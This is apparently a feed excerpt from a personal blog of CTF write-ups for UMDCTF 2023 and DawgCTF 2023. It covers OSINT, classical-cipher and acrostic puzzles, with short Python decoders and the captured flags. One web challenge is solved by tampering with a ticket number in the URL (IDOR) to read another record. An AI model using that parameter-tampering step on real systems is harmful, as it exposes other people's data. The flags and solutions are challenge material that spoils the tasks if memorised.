&lt;h1 id=&quot;mirror-unknown&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#mirror-unknown&quot; aria-label=&quot;Anchor link for: mirror-unknown&quot;&gt;Mirror Unknown&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_mirror.png&quot; alt=&quot;mirror&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The attached image is&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_mirror1.png&quot; alt=&quot;mirror1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Solution,&lt;&#x2F;p&gt;
&lt;p&gt;Did a reverse image search on google images. And found the letters associated with the symbols.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;lens.google.com&#x2F;search?p=ATHekxerHQuSfeoaj3EZuxksrJRLN2lKODT1iiXlao7WYlgVQ9PEur4KOhjNvgU6awWK6K5r5D90H_dTI5-VuQa6i7fgp2ImdswSBpCNy_uZo3FzCylYUA8aDQc-hzEJTuXgOoy_m1mC7QTZBE5TH51MFcoMO8sWvqMtVWINMZj_iM1DYXmyHN7pvGwpeUKOc5T-kt6bvqEdFvOLHNtyv4Riw7t2Qn9BkX9JNMrYHKKvjh30uuFEGLpVkbuTW7jqDLoEj_YHysjJRSsT0cOdR1uSy0XXA3CCm3GUFbwccW9S&amp;ep=gsbubb&amp;hl=en-IN&amp;re=df#lns=W251bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsIkVrY0tKR1V3WldGbE1tWTVMV1E0T1RndE5EUTFaaTFpWmprd0xUTTFOR1ppTWpZeU9EUmpOUklmVFMxQlR6VkxhVmROVTFsbFdVeHVaVFo2U1ROWFNFOVdXbWN5TUdaQ1p3PT0iXQ==&quot; target=_blank&gt;Image reverse search result&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The Alphabets associated with symbols are - &lt;code&gt;HOJNISSNIUR&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Reversed the letters as the challenge says it mirror - &lt;code&gt;SINJOHRUINS&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Found that Sinjoh ruins is a place, It might be the correct flag and it is.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : UMDCTF{SINJOHRUINS}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;osint&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#osint&quot; aria-label=&quot;Anchor link for: osint&quot;&gt;OSINT&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;gone-missing-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#gone-missing-1&quot; aria-label=&quot;Anchor link for: gone-missing-1&quot;&gt;Gone Missing 1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_gone1.png&quot; alt=&quot;gone1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The link attached hosted this location image&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_gone12.png&quot; class=&quot;autoimg&quot;&gt;
&lt;p&gt;Again did a reverse image search search&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.google.com&#x2F;maps&#x2F;place&#x2F;The+Royal+Palace&#x2F;@59.9182997,10.7273703,15.03zdata=!4m8!3m7!1s0x46416dd779ba357b:0x677038c9acc2591c!8m2!3d59.9170428!4d10.7273769!9m1!1b1!16zL20vMDU1ZDY4&quot; target=_blank&gt;Image reverse search result&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Found that it is &lt;a&gt;Royal Palace, Oslo&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Selected the Royal palace in the map given at the bottom right corner, got the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : UMDCTF{I_b3t_rainbolt_c0uld_g3t_th1s_!n_thr33_s3c0nd5}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#web&quot; aria-label=&quot;Anchor link for: web&quot;&gt;Web&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;treps-ticket-system&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#treps-ticket-system&quot; aria-label=&quot;Anchor link for: treps-ticket-system&quot;&gt;Treps Ticket System&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_tts.png&quot; alt=&quot;tts&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The attached URL hosted a form like this,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_tts1.png&quot; alt=&quot;tts1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Inputed the Test creds name = test email = test@gmail.com&lt;&#x2F;p&gt;
&lt;p&gt;It loaded a ticket with the URL &lt;code&gt;https:&#x2F;&#x2F;tts.chall.lol&#x2F;ticket?num=12&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_tts2.png&quot; alt=&quot;tts2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Tried &lt;code&gt;IDOR&lt;&#x2F;code&gt; in the URL. changed the &lt;code&gt;num=0&lt;&#x2F;code&gt; and recieved the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : UMDCTF{d0nt_b3_@n_id0r_@lw@ys_s3cur3_ur_tick3ts}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Dawg CTF 2023</title>
        <published>2023-04-24T00:00:00+00:00</published>
        <updated>2023-04-24T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/dawgctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/dawgctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/dawgctf23/">&lt;p&gt;Hello Matesssss!
I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1974&quot; target=_blank&gt;DawgCTF 2023&lt;&#x2F;a&gt; which was happened from  21 Apr to 23 Apr. I played it with the team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This time its a BANGG... Yes, we ranked &lt;strong&gt;&lt;code&gt;Top 6&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; globally. Yes, we &lt;strong&gt;&lt;code&gt;Invaders0x1&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; got 6th in &lt;strong&gt;DawgCTF2023&lt;&#x2F;strong&gt;. I got one first blood ü©∏ and we are in the top solvers list in many challenges.&lt;&#x2F;p&gt;
&lt;img src =&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_progress.png&quot; class=&quot;autoimg&quot;&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot;&gt;Crypto&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;you-step-away-for-just-one-minute-drop-of-blood&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#you-step-away-for-just-one-minute-drop-of-blood&quot; aria-label=&quot;Anchor link for: you-step-away-for-just-one-minute-drop-of-blood&quot;&gt;You step away for just ONE minute! ü©∏&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_youstep.png&quot; alt=&quot;step away&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Cipher text : &lt;code&gt;wTw13!!5aC{_vs1gDgF30_bn}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I know this is a transposition cipher. Immediately I used &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;transposition-cipher&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; and bruteforced the cipher to get the flag.&lt;&#x2F;p&gt;
&lt;p&gt;I saw someone(smart) used this program to solve.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;scramble &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;wTw13!!5aC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;{_vs1gDgF30_bn}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;idx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;scramble&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;index&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(scramble)):
&lt;&#x2F;span&gt;&lt;span&gt;    flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;scramble[idx]
&lt;&#x2F;span&gt;&lt;span&gt;    idx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(idx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(scramble)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(flag) 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{w3_10v3_s!b1!ng5}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;birds&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#birds&quot; aria-label=&quot;Anchor link for: birds&quot;&gt;Birds!&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_birds.png&quot; alt=&quot;birds&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And a quick search on google results &lt;code&gt;bird on the wire cipher&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Solved the chall using  &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;birds-on-a-wire-cipher&quot; target=_blank&gt;this site&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_birds1.png&quot; alt=&quot;birds&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Plain text : ONEINHANDORTWOINBUSH&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : ONEINHANDORTWOINBUSH&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;choo-choo&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#choo-choo&quot; aria-label=&quot;Anchor link for: choo-choo&quot;&gt;Choo Choo!&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_choo.png&quot; alt=&quot;choo&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Cipher text : D1_a4nrCwrs30gt_poC_tu1T3h5!Fk3_}{1y31l_r_4&lt;&#x2F;p&gt;
&lt;p&gt;They are talking about rail and i know its &lt;code&gt;reil fence cipher&lt;&#x2F;code&gt;. And they are hinted that 10, so I used 10 as the key for reilfence cipher.&lt;&#x2F;p&gt;
&lt;p&gt;Using &lt;a href=&quot;https:&#x2F;&#x2F;www.boxentriq.com&#x2F;code-breaking&#x2F;rail-fence-cipher&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; will be helpful.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_choo1.png&quot; alt=&quot;choo solve&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{1_l1k3_tr41ns_th3y_4r3_5up3r_C0o1!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;chuck-s-code&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chuck-s-code&quot; aria-label=&quot;Anchor link for: chuck-s-code&quot;&gt;Chuck&#x27;s Code&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_chucks.png&quot; alt=&quot;chucks&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The attached file contains these 0&#x27;s&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Searched on google for &lt;code&gt;chucks cipher&lt;&#x2F;code&gt; to confirm wheather it is existed or not. Found that it is existed! Used &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;chuck-norris-code&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; and selected 7-bit ASCII encoding. And decrypted the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_chucks1.png&quot; alt=&quot;chuckssolve&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: DawgCTF{chuck_n0rr1s_p0w3rs!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;thermodynamic-analysis&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#thermodynamic-analysis&quot; aria-label=&quot;Anchor link for: thermodynamic-analysis&quot;&gt;Thermodynamic Analysis&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_thermo.png&quot; alt=&quot;thermo&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The attached file contains these physics formales.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;D=1&#x2F;2mv^2 (force * displacement) = 1&#x2F;2 * mass * velocity^2 + alpha
&lt;&#x2F;span&gt;&lt;span&gt;w=fd (force * displacement) with respect to displacement lag
&lt;&#x2F;span&gt;&lt;span&gt;Cp=20.79 J&#x2F;K&#x2F;Mol for a constant pressure ONLY FOR OUTPUT
&lt;&#x2F;span&gt;&lt;span&gt;FINAL TEMPERATURE ALWAYS COMES FIRST BECAUSE THE TEMPERATURE DELTA IS INSIDE {
&lt;&#x2F;span&gt;&lt;span&gt;temperature min, temperature max}, like with
&lt;&#x2F;span&gt;&lt;span&gt;e=u+pVr
&lt;&#x2F;span&gt;&lt;span&gt;m=0
&lt;&#x2F;span&gt;&lt;span&gt;dU=mcdT and remember that sometimes mcdT can be a dy
&lt;&#x2F;span&gt;&lt;span&gt;nA is number of moles of gas A&#x2F;B^4
&lt;&#x2F;span&gt;&lt;span&gt;mA*cA*‚àÜT=cB*cB*‚àÜT when two things are equalizing i.e and indirect carnot cycli
&lt;&#x2F;span&gt;&lt;span&gt;c, such as with the following equation: 2500kg*cA*(500-400)=cB*cB*‚àÜT*5
&lt;&#x2F;span&gt;&lt;span&gt;s=ksubb * ln * omega * tau
&lt;&#x2F;span&gt;&lt;span&gt;cv=12.47J&#x2F;K&#x2F;Mol for a constant vol, Klevin is k
&lt;&#x2F;span&gt;&lt;span&gt;s=integral from vi to vf of (1&#x2F;T *dU) for a general delta!
&lt;&#x2F;span&gt;&lt;span&gt;}]\d\wa\dT
&lt;&#x2F;span&gt;&lt;span&gt;h=W&#x2F;ti (Power) = Work &#x2F; time elapsed in seconds i
&lt;&#x2F;span&gt;&lt;span&gt;sv=dx&#x2F;dm, aka momentum i
&lt;&#x2F;span&gt;&lt;span&gt;singleton particles are usually carrying a charged ion
&lt;&#x2F;span&gt;&lt;span&gt;0*pe=mgh aka potential energy with respect to gravity zeroed to t
&lt;&#x2F;span&gt;&lt;span&gt;p=x^8&#x2F;fd+a
&lt;&#x2F;span&gt;&lt;span&gt;radial work=fd force * displacement
&lt;&#x2F;span&gt;&lt;span&gt;overall pv=nrt (pressure * volume) = (quantity of gas) * (avagadro&amp;#39;s num) * temp f
&lt;&#x2F;span&gt;&lt;span&gt;the equilibrium pos of a container filled with ideal gas h
&lt;&#x2F;span&gt;&lt;span&gt;extended to a near symmetrical distribution of constant mass f
&lt;&#x2F;span&gt;&lt;span&gt;less than with uniform distribution=(nA&#x2F;(na+nB))*L where L=na
&lt;&#x2F;span&gt;&lt;span&gt;g+nA is number of moles of gas A&#x2F;B!
&lt;&#x2F;span&gt;&lt;span&gt;Total num of states = (Volf&#x2F;Voli)^n
&lt;&#x2F;span&gt;&lt;span&gt;mA*cA*‚àÜT=cB*cB*‚àÜT when two things are equalizing via direct conduction
&lt;&#x2F;span&gt;&lt;span&gt;Qa=Qb (heat lost equals heat gained, because of conservation of energy,
&lt;&#x2F;span&gt;&lt;span&gt; use this to solve for etc)
&lt;&#x2F;span&gt;&lt;span&gt;‚àÜT=(Tf-Ti) (when temperature is decreasing, this becomes (Ti - Tf))
&lt;&#x2F;span&gt;&lt;span&gt;When we have a material that changes states, i.e ice to water,
&lt;&#x2F;span&gt;&lt;span&gt;our equation should look something like this:
&lt;&#x2F;span&gt;&lt;span&gt;Q=m*cA*(Tm-Ti) + m*cB*(T-Tm) + m*L (where cA is the specific heat of the initi
&lt;&#x2F;span&gt;&lt;span&gt;al state, cB is the specific heat of the state it transforms into, and
&lt;&#x2F;span&gt;&lt;span&gt;L is the latent heat of fusion for that state change, and Tm is the temp
&lt;&#x2F;span&gt;&lt;span&gt;at which the state change occurs)
&lt;&#x2F;span&gt;&lt;span&gt;REMEMBER - YOU CAN SET FUNCTIONS EQUAL TO ANOTHER AND CANCEL LIKE TERMS
&lt;&#x2F;span&gt;&lt;span&gt;(for instance, if kinetic energy is converted completely to heat, you can
&lt;&#x2F;span&gt;&lt;span&gt;set K=mC‚àÜT and solve even without knowing m)
&lt;&#x2F;span&gt;&lt;span&gt;REMEMBER - When a material is initially at it&amp;#39;s state change point, and
&lt;&#x2F;span&gt;&lt;span&gt;then is equalized or heated, you ignore 
&lt;&#x2F;span&gt;&lt;span&gt;U = f&#x2F;2nRT where R is the gas constant and f is the degrees of freedom
&lt;&#x2F;span&gt;&lt;span&gt;p is pascals, v is volume in m, n is moles, R is 8.314, T is kelvin temp
&lt;&#x2F;span&gt;&lt;span&gt;‚àÜS = Change in entropy
&lt;&#x2F;span&gt;&lt;span&gt;‚àÜU = n Cp ‚àÜT where U is internal energy of an ideal gas
&lt;&#x2F;span&gt;&lt;span&gt;KE=3&#x2F;2nRT
&lt;&#x2F;span&gt;&lt;span&gt;Avg Kinetic Energy per Molecule
&lt;&#x2F;span&gt;&lt;span&gt;KE=3&#x2F;2KbT
&lt;&#x2F;span&gt;&lt;span&gt;Average velocity of atoms in an ideal gas
&lt;&#x2F;span&gt;&lt;span&gt;V = sqrt(3RT&#x2F;m) (Where R is 8.314, and m is atomic mass * Avagadro)
&lt;&#x2F;span&gt;&lt;span&gt;‚àÜL=L0Œ±(‚àÜT) 
&lt;&#x2F;span&gt;&lt;span&gt;‚àÜQ = m * Csteel * (‚àÜT)
&lt;&#x2F;span&gt;&lt;span&gt;W=P*‚àÜV
&lt;&#x2F;span&gt;&lt;span&gt;Cv=12.47J&#x2F;K&#x2F;Mol for a constant vol
&lt;&#x2F;span&gt;&lt;span&gt;Cp=20.79 J&#x2F;K&#x2F;Mol for a constant pressure
&lt;&#x2F;span&gt;&lt;span&gt;avagadro&amp;#39;s number - 8.314
&lt;&#x2F;span&gt;&lt;span&gt;In general, ‚àÜS=integral from vi to vf of (1&#x2F;T *dU)
&lt;&#x2F;span&gt;&lt;span&gt;for constant temp, this is ‚àÜS = ‚àÜU&#x2F;T
&lt;&#x2F;span&gt;&lt;span&gt;for changing temp, this is ‚àÜS = m*c*ln(Tf&#x2F;Ti)
&lt;&#x2F;span&gt;&lt;span&gt;USE KELVIN FOR ENTROPY
&lt;&#x2F;span&gt;&lt;span&gt;‚àÜU=Q=mc‚àÜT
&lt;&#x2F;span&gt;&lt;span&gt;dU=mcdT
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Lice*Mice+MiWater*CiWater*(T-273.15)=Mwater*Cwater*(363.15-T)
&lt;&#x2F;span&gt;&lt;span&gt;100*333500+100*4200*(T-273.15)=500*4200*(363.15-T)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Eice=33350000&#x2F;273=122000
&lt;&#x2F;span&gt;&lt;span&gt;Eiwater=100*4200*ln(334.9&#x2F;273.15)=85600.5716825
&lt;&#x2F;span&gt;&lt;span&gt;Ewater=500*4200*ln(334.9&#x2F;363.15)=-510199.151188
&lt;&#x2F;span&gt;&lt;span&gt;T=334.915873016
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;When I closesly observed the text, I found that the first line starts with &lt;code&gt;D&lt;&#x2F;code&gt; and ends with &lt;code&gt;a&lt;&#x2F;code&gt; , Seconds line starts with &lt;code&gt;w&lt;&#x2F;code&gt; ends with &lt;code&gt;g&lt;&#x2F;code&gt;. It is the flag format nd thats the solution, I wrote this simple&lt;br &#x2F;&gt;
&lt;code&gt;solve.py&lt;&#x2F;code&gt; to print the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;STUDYME.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;    l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# print(l)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;l:
&lt;&#x2F;span&gt;&lt;span&gt;    i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;i[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# DawgCTF{therm0dyn4mic5sucks!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: DawgCTF{therm0dyn4mic5sucks!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
